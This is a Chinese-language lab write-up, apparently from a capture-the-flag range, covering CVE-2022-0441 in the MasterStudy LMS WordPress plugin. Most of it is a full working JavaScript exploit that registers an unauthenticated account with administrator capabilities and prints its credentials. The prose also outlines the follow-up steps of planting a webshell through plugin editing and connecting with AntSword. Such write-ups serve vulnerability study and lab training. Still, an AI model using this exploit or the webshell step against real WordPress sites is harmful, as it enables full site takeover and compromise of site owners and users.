---
title: CVE-2022-0441【RCE】
author: Ghost
date: 2023-12-10
categories:
  - ['春秋云境', '漏洞靶标']
  - 漏洞复现
tags:
  - 'RCE'
---

## 1. 漏洞描述

The MasterStudy LMS WordPress plugin before 2.7.6 does to validate some parameters given when registering a new account, allowing unauthenticated users to register as an admin

## 2. 漏洞复现

先利用漏洞注册个管理员，再利用编辑插件的权限写入木马，最后用蚁剑连接获取 flag。

![演示.gif](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312061148584.gif)

poc【[MasterStudy LMS – WordPress LMS Plugin 2.7.5 - Privilege Escalation (Unauthenticated) · GitHub](https://gist.github.com/numanturle/4762b497d3b56f1a399ea69aa02522a6)】

```js
function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

jQuery(document).ready(function($){
	username = "poctesting"+randomInt(1,1337);
	password_poc = "S3cr3t"+randomInt(1,1337);
	nonce = stm_lms_nonces.stm_lms_register

	post_data = {
		"user_login":username,
		"user_email":username+"@"+window.location.host,
		"user_password":password_poc,
		"user_password_re":password_poc,
		"become_instructor":"",
		"privacy_policy":true,
		"degree":"",
		"expertize":"",
		"auditory":"",
		"additional":[],
		"additional_instructors":[],
		"profile_default_fields_for_register":{
			"wp_capabilities":{
				"value":{
					"administrator":1
				}
			}
		}
	}
	
$.ajax({
    type: "POST",
    url: stm_lms_ajaxurl+"?action=stm_lms_register&nonce="+nonce,
    data: JSON.stringify(post_data),
    contentType: "application/json; charset=utf-8",
    dataType: "json",
    success: function(data){
		if(data.status == "success"){
			//window.location.href = "wp-admin/"
			console.log('%cRegistration Successful', 'color: black; background: yellow; font-size: 30px');
			console.log("Username : " + username);
			console.log("Password : " + password_poc);
		}
	},
    error: function(errMsg) {
        console.log(errMsg);
    }
});

});
```


参考：

[CVE-2022-0441 - MasterStudy LMS 2.7.6 - Unauthenticated Admin Account Creation - YouTube](https://www.youtube.com/watch?v=SI_O6CHXMZk)

[MasterStudy LMS – WordPress LMS Plugin 2.7.5 - Privilege Escalation (Unauthenticated) · GitHub](https://gist.github.com/numanturle/4762b497d3b56f1a399ea69aa02522a6)

